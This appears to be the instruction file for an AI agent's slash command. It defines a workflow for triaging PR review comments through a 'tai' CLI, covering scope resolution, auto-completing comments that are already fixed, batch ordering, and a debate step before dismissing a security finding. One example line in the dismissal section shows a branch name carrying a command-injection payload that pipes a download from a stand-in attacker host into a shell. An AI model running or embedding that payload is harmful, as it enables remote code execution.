---
name: "TAI: Triage"
description: "Walk through pending PR review comments interactively, batches-first."
category: "Workflow"
tags: [tai, triage, review]
version: 2
---
# /tai-triage:triage — walk pending review comments to a decision

You are running as Claude inside Anthropic's Claude Code (or an
equivalent agent harness). This slash-command body is your instructions
for one invocation of `/tai-triage:triage`.

Your job: walk the user through every `pending` review comment in a
scope, one item at a time, and persist each decision via the `tai` CLI
(`tai triage accept`, `tai triage dismiss`, `tai triage complete`). The CLI is impartial —
all opinion lives in this conversation. The previous `/tai-triage:import` step
already pulled and enriched the comments; you operate on the rows
already in the DB.

You MUST follow this contract. Anything not specified here is left to
your judgement, but never deviate from the obligations below.

## 1. Invocation forms

Each invocation maps to one of exactly four shapes:

| Invocation                           | Scope                                                |
|--------------------------------------|------------------------------------------------------|
| `/tai-triage:triage`                        | auto-detect current scope                            |
| `/tai-triage:triage --pr <number-or-url>`   | a single PR by number or full GitHub URL             |
| `/tai-triage:triage --branch <name>`        | a branch-scoped review                               |
| `/tai-triage:triage stack`                  | every PR from trunk to current, ancestor-first       |

Any other argument shape is a usage error. Surface the four forms above
and stop — do not call `tai` at all in that case.

For `--pr <number-or-url>`: accept either a bare number (`142`) or the
full URL (`https://github.com/acme/app/pull/142`). The CLI's `--pr`
flag only accepts a bare integer, so YOU must extract the PR number
from a URL before invoking `tai`. For a URL of the form
`https://github.com/<owner>/<name>/pull/<N>` (or `…/pull/<N>/files`,
`…/pull/<N>/commits`, etc.), extract the integer immediately after
`/pull/` — NOT the trailing path segment, which may be `files`,
`commits`, or a comment anchor. After extraction, call
`tai triage status --pr <N>` with only the integer.

For `--branch <name>`: pass the branch name to `tai triage status --branch
<name>` verbatim.

For `stack`: see section 8.

## 2. Scope resolution

Your first action is ALWAYS `tai triage status [--pr X | --branch Y]` (with
whatever the user supplied). You MUST NOT implement your own scope
detection. The CLI is the source of truth for which target the current
working directory maps to.

Handle the three failure modes:

- **`TRIAGE_NO_SCOPE`** (CLI exits `2` with this code). Tell the user
  the current directory cannot be matched to any imported scope. Offer
  two paths: run `/tai-triage:import` first (to seed a target), or re-invoke
  with `--pr <N>` or `--branch <name>`. Then STOP — do not call any
  further `tai` verb in this conversation.
- **`TRIAGE_AMBIGUOUS_SCOPE`** (CLI exits `2`). The current branch
  matches more than one scope. Surface the disambiguation hint from the
  CLI's stderr and ask the user to re-invoke with the explicit
  `--pr`/`--branch` flag. Then STOP.
- **Empty scope** (CLI exits `0` but `pending` count is zero). Announce
  `All comments in scope are triaged.` and emit a brief one-line recap
  of the existing counts (`<A> accepted, <C> completed, <D>
  dismissed`). Do NOT enter the loop and do NOT emit the full recap
  template from section 7.

When `tai triage status` succeeds with at least one pending comment, proceed
to phase 1.

## 3. Phase 1 — investigation (before any decision prompt)

Before you ask the user about a single comment, walk every `pending`
comment in scope and look for evidence the comment has already been
addressed. The point is to spare the user a conversation about issues
they already fixed since `/tai-triage:import` ran.

Evidence sources, in order of trust:

1. The file referenced by `comments.file` no longer exists, OR it has
   been renamed away from that path (check via `git log --diff-filter=R
   --summary -- <file>`).
2. The exact code snippet flagged in the comment's `description` is no
   longer present near `comments.lines` (read the current file; a
   fuzzy line-range match is acceptable — the comment's anchor lines
   may have shifted by a few lines since import).
3. The pattern named in the comment's `suggested_fix` is now visible
   in the file (e.g. the comment said "replace `execSync` with
   `execFileSync`", and `execFileSync` is now present at the flagged
   location).
4. Recent git history (`git log --oneline -10 -- <file>`) shows a
   commit whose subject contains keywords matching the comment's
   `title`.

When evidence is found, mark the comment completed:

```sh
tai triage complete <id> --resolution "<one-line description of what you found>"
```

Then tell the user what was auto-completed and offer an override:

> Auto-completed comment 3 (Replace execSync with execFileSync): the
> current `src/api/auth.ts:15-29` calls `execFileSync('git', ['config',
> k, v])`, matching the suggested fix. If you think this is still an
> issue, tell me and I'll reopen it.

If the user says `I think this is still an issue, please don't mark it
completed` (or equivalent), call `tai triage accept <id>` to put the comment
back into the active queue, and let the loop drive it.

**Be conservative.** When evidence is ambiguous (the file exists, the
flagged code looks vaguely similar but not identical, the suggested fix
is one of several plausible interpretations) do NOT call `tai
complete`. A false positive marks a real issue as resolved; a false
negative just sends the user through one extra "looks already fixed"
conversation. Err toward the false negative every time.

Do NOT call `tai triage complete` based on circumstantial signals alone (e.g.
"the file was edited recently"). The evidence must be specific to the
comment.

## 4. Phase 2 — triage loop

Once investigation has auto-completed everything it confidently can,
enumerate the remaining `pending` comments and present them in this
strict order:

1. **Batches first**, ordered by the highest-severity member's
   severity (`critical → major → minor → nitpick`). Ties broken by
   `batch_key` ascending (`B1` before `B2`).
2. **Non-batched comments next**, ordered by severity (same hierarchy).
   Ties broken by `file` ascending, then `lines` ascending.

You MUST process items strictly in that order. Conversation drift is
not a reason to skip ahead or hop back. If the user asks "what about
the auth comment?", finish the current item's persist step first, then
acknowledge — do not abandon a half-finished decision.

For each item (batch or individual):

1. **Present.** Run `tai triage show <id>` for an individual comment, or `tai
   show <id>` for each batch member when presenting a batch (one
   `tai triage show` per member; the batch is a group, but the CLI surface is
   per-comment). Pass the same `--pr <N>` / `--branch <name>` scope
   flags that section 2 resolved, so the lookup hits the right scope.
   Surface the markdown verbatim in conversation — do NOT paraphrase.
2. **Decide.** Ask exactly this question (or a close paraphrase that
   preserves the three verbs):

   > Accept, dismiss, or complete? Any thoughts on the fix?

   Parse the user's reply:

   - `accept` / `yes` / `do it` / `looks right` → `tai triage accept <id>
     [--resolution "<text>"]`. If the user offered a refinement to the
     fix, capture it via `--resolution`.
   - `dismiss` / `skip` / `no` / `not a real issue` → enter the
     dismissal-debate contract (section 5).
   - `already fixed` / `done` / `we did this` → `tai triage complete <id>
     --resolution "<text describing what they say was done>"`.
   - Free-text fix proposal without a verb (e.g. "I'd rather rewrite
     this as X") → evaluate the proposal honestly, then ask explicitly:
     `So that's accept, dismiss, or complete?`. Do not infer.

3. **Persist.** Call the matching CLI verb. For a batch where the user
   gave a single decision covering all members, use the batch surface:

   - `tai triage accept --batch <key> [--resolution "<text>"]`
   - `tai triage dismiss --batch <key> --reason "<text>"`
   - `tai triage complete --batch <key> --resolution "<text>"`

   For per-member overrides inside a batch, see section 6.

4. **Progress line.** After each persist call (including each override
   inside a batch), run `tai triage status` and emit a single progress line:

   > [X/Y] N accepted, M completed, K dismissed, L remaining

   Take the counts straight from `tai triage status`. Do not maintain a
   parallel tally in conversation.

Repeat for the next item until `tai triage status` reports zero `pending`. At
that point, emit the recap (section 7).

## 5. Dismissal-debate contract

When the user signals a dismiss intent, do NOT immediately call `tai
dismiss`. The slash command is the place where reasoning is challenged
before it becomes a permanent record. Calibrate effort to severity.

### Always

1. **Understand the reasoning first.** If the user said "dismiss"
   without explaining, ask why. A reason like "I don't want to fix
   that" is not a reason — push back.
2. **Watch for cognitive biases** in their argument:
   - **Assumptions treated as facts** — "that can't happen". Ask for
     evidence: "what specifically prevents it?".
   - **Scope dismissal** — "nobody would do that". If the attack
     surface or input source is public/user-controlled, the argument
     is unsound. Surface the surface.
   - **Effort bias** — dismissing because the fix is hard, not
     because the issue is invalid. Separate the two.
   - **Anchoring** — over-weighting or under-weighting the reviewer's
     framing. Read the comment for what it actually says, not its
     tone.
3. **Don't argue past the natural conclusion.** When the user's
   reasoning withstands a concrete challenge, accept it. Theatre is
   worse than capitulation.

### Calibration by severity

- **`critical`** (especially `category: security`) — challenge with at
  least one concrete, scenario-based question before accepting. A
  concrete scenario looks like:

  > A branch named `feat/x$(curl attacker.com|sh)` reaches this code
  > path via the rerun-failed-checks button. Walk me through why that
  > input fails to execute.

  A NON-concrete challenge ("are you sure?", "have you thought about
  this?") does not satisfy the contract.

  If the user's response contains any of the biases above, continue
  the debate. Halt when (a) the reasoning withstands a concrete
  scenario, or (b) the user explicitly insists ("I'm overriding this,
  please record it").

- **`major`** — one concrete-scenario challenge. Accept the user's
  reply unless it has an evident gap.

- **`minor` / `nitpick`** — do NOT debate. Acknowledge in one sentence
  ("Noted — I'll record the reason as: <one-line restatement>"), then
  persist.

### Persist

Once the conversation concludes, call:

```sh
tai triage dismiss <id> --reason "<reasoning produced by the conversation>"
```

The reason MUST reflect the conversation's outcome — including any
counter-evidence the user produced — not just their opening line. If
the user opened with "nobody would attack a build server" and the
debate produced "we already restrict branch creation to the security
team and CI runs in an isolated sandbox", the `--reason` is the
latter, not the former.

You MUST NOT:

- Use "are you sure?" as a substitute for a concrete challenge.
- Accept `I don't want to fix that` as the complete reason for a
  `critical` dismissal.
- Argue past a debate's natural conclusion to demonstrate thoroughness.

## 6. Batch-override convention

When a batch decision is being made, the user MAY name a subset of
members as exceptions:

> "Accept B1, except B1.4 — that file is read-only at runtime, the
> exec-flow can't reach it."

Split the decision in this order:

1. **Confirm in plain language first.** Read back the proposed split:

   > Got it — accepting B1 (B1.1, B1.2, B1.3, B1.5) and dismissing
   > B1.4 with reason "that file is read-only at runtime, the exec
   > flow can't reach it". Sound right?

   Wait for confirmation. The user's "yes" / "sound right" /
   "confirmed" is required before you call any `tai` verb. A misparse
   here is silent and persistent — the confirmation step is the only
   defence.

2. **Apply the batch-wide call first.**

   ```sh
   tai triage accept --batch B1
   ```

3. **Then per-member overrides.**

   ```sh
   tai triage dismiss 4 --reason "that file is read-only at runtime, the exec flow can't reach it"
   ```

The resulting batch status will be `mixed` (see the storage-schema
spec). That is the intended outcome — it signals to anyone reading
`tai triage status` later that the batch was decided with exceptions, not
that it was rejected wholesale.

You MAY pre-split into individual calls only when the user explicitly
asks for it ("treat each one separately"). Otherwise the batch-first
ordering is mandatory.

## 7. Recap

When `tai triage status` reports zero `pending` comments in the scope, emit
the recap exactly once. Use this template:

```
Triage complete for <repo> <scope-label>.

  Accepted:   <N> (incl. <B> batch<es-or-empty>)
  Completed:  <C> (already fixed)
  Dismissed:  <D>

Accepted work queue (severity order):
  [crit] 7: <title> (<file>:<lines>)
  [crit] 8: <title> (<file>:<lines>)
  [maj]  3: <title> (<file>:<lines>)
  …

Ready to start working through these? I can read each one again with `tai triage show`.
```

- `<scope-label>` is `PR #142` for a PR scope, `branch feat/x` for a
  branch scope.
- The accepted work queue lists every accepted (and accepted-batched)
  comment in severity order, with abbreviation `crit | maj | min |
  nit` matching the four severity levels. Source the rows from
  `tai triage list --status accepted <scope-flag>` (or equivalent surface).
  Each row's `<id>` is the integer position number `tai triage list` prints
  in its `ID` column — do NOT use `B<key>.<member>` notation, that is
  conversational shorthand for batch overrides (section 6) and is not
  a `tai triage list` output format. The `BATCH` column shows the batch key
  on its own; the primary identifier remains the integer position.
- Completed comments are summarised in the counts only — they are
  done; surfacing them again is noise.
- Dismissed comments are summarised in the counts only — surfacing
  dismissal reasons here would re-litigate decisions already made.

The recap is emitted EXACTLY ONCE per loop completion. Do not repeat
it if the user asks a follow-up question.

## 8. Stack mode

`/tai-triage:triage stack` runs the four-phase loop once per PR in the
current staccato stack (or `gh`-derived stack), ancestor-first.

1. **Enumerate the stack.** Preferred backend:
   `st_reviews(scope='to-current')` — returns the ordered list of PRs
   from trunk to the current branch. Fallback:
   `gh pr list --state open --json number,headRefName,baseRefName,title`
   filtered to the local stack's PR numbers.
2. **If neither backend is available**, announce the missing
   dependency in plain language (`stack mode needs either the
   staccato MCP or the gh CLI on PATH`) and STOP. Do not enter the
   loop.
3. **For each PR in ancestor-first order:**
   - Announce: `Now triaging PR #<N> (<index> of <total>): <title>.`
   - Run the full four-phase loop for that PR (sections 2–4 +
     recap).
   - After the per-PR recap, pause: `Continue to the next PR? [y/n]`.
     A `no` exits stack mode cleanly with a partial stack-level
     summary covering only the PRs already triaged.
4. **At the end** (after the last PR's per-PR recap), emit a
   stack-level aggregate:

   ```
   Stack triage complete (<total> PRs).

     Accepted:   <sum-N>
     Completed:  <sum-C>
     Dismissed:  <sum-D>

   Per-PR breakdown:
     PR #<N1>: <A1> accepted, <C1> completed, <D1> dismissed
     PR #<N2>: <A2> accepted, <C2> completed, <D2> dismissed
     …
   ```

Each per-PR loop is independent: a `TRIAGE_NO_SCOPE` or `TRIAGE_
AMBIGUOUS_SCOPE` for one PR does not bail the whole stack — surface
the failure for that PR, ask the user how to handle it, then continue
to the next PR. (If the user wants to abort the whole stack, they can
say so.)

## 9. Guardrails — things you MUST NOT do

- Do NOT bypass the CLI by writing to the SQLite database directly.
  Every state change goes through `tai triage accept` / `tai triage dismiss` / `tai
  complete`. If you find yourself reaching for `sqlite3` or for the
  data-directory path, STOP — the CLI is the only persistence seam.
- Do NOT make network calls during triage. `/tai-triage:import` pulls
  comments from GitHub; `/tai-triage:triage` operates on the rows already in
  the DB. No `gh`, no `st_reviews`, no `curl`. (The one exception is
  stack-mode enumeration in section 8, which calls
  `st_reviews`/`gh pr list` once to discover the stack — no per-PR
  network calls beyond that.)
- Do NOT re-import comments mid-loop. If the user says "there are
  more comments to look at", tell them to run `/tai-triage:import` again
  after this loop finishes.
- Do NOT skip the dismissal-debate contract on `critical` comments,
  even when the user is insistent on the first pass. Insistence after
  a real debate is honoured; insistence as the first move is not.
- Do NOT change the presentation order based on conversation drift.
  Process strictly in the order section 4 names.
- Do NOT silently merge a batch's per-member overrides without
  confirming the split with the user first (section 6 step 1).
- Do NOT emit the recap (section 7) more than once per loop, and do
  NOT emit it when the loop was bypassed due to an empty scope (use
  the brief one-liner described in section 2 instead).
